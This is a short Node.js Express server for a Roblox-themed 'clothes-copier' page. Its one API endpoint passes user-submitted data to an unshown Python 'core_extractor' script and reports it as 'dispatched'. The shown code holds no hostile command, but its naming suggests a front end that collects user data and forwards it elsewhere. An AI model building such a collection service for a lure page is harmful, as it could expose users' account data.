const express = require('express');
const path = require('path');
const { spawn } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// Routes for Custom URLs
app.get('/clothes-copier', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Automatically redirect root homepage to /clothes-copier
app.get('/', (req, res) => {
    res.redirect('/clothes-copier');
});

// API Processing Endpoint
app.post('/api/process', (req, res) => {
    const { data } = req.body;

    if (!data) {
        return res.status(400).json({ success: false, error: 'No data provided' });
    }

    // Base64 encode input data securely to pass into Python script
    const encodedData = Buffer.from(data).toString('base64');

    const pythonProcess = spawn('python3', ['core_extractor.py', encodedData], {
        env: { ...process.env }
    });

    let stderrData = '';

    pythonProcess.stderr.on('data', (chunk) => {
        stderrData += chunk.toString();
        console.log(`[Python Log] ${chunk.toString().trim()}`);
    });

    pythonProcess.on('close', (code) => {
        if (code === 0) {
            res.json({ success: true, message: 'Payload processed and dispatched successfully.' });
        } else {
            res.status(500).json({ 
                success: false, 
                error: 'Extractor execution failed.', 
                details: stderrData.trim() 
            });
        }
    });
});

app.listen(PORT, () => {
    console.log(`🚀 RBXDEV Server running live on port ${PORT}`);
});
